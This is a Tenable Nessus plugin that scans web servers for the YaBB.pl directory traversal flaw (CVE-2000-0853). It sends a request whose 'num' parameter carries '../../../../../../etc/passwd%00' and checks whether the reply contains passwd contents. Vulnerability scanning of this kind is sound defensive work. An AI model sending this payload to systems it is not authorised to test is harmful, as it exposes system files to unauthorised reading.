#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10512);
 script_version ("$Revision: 1.31 $");
 script_cve_id("CVE-2000-0853");
 script_bugtraq_id(1668);
 script_osvdb_id(411);

 script_name(english:"YaBB YaBB.pl num Parameter Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that suffers from an
information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The 'YaBB.pl' CGI script is installed on the remote host.  This script
has a well-known security flaw that lets an attacker read arbitrary
files with the privileges of the http daemon (usually root or nobody)." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2000/Sep/213");
 script_set_attribute(attribute:"solution", value:
"Remove 'YaBB.pl' or upgrade to the latest version." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2000/09/12");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/09/09");
 script_cvs_date("$Date: 2016/11/01 20:05:52 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english:"Checks for the presence of YaBB.pl");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "web_traversal.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);

if (get_kb_item("www/"+port+"/generic_traversal"))
  exit(0, 'The web server on port '+port+' is vulnerable to web directory traversal.');

if (thorough_tests) dirs = list_uniq(make_list("/yabb", "/forum", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (cgi_dirs())
{
 u = string(dir, "/YaBB.pl?board=news&action=display&num=../../../../../../etc/passwd%00");
 r = http_send_recv3(method: "GET", item: u, port:port, exit_on_fail: 1);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r[2]))
 {
   if (report_verbosity > 0)
   {
     txt = '\nThis URL returns the content of /etc/passwd :\n' +
     	 build_url(port: port, qs: u) + '\n';
     security_warning(port:port, extra: txt);
   }
   else
     security_warning(port);
   exit(0);
 }
}

exit(0, 'The web server on port '+port+' is not vulnerable.');
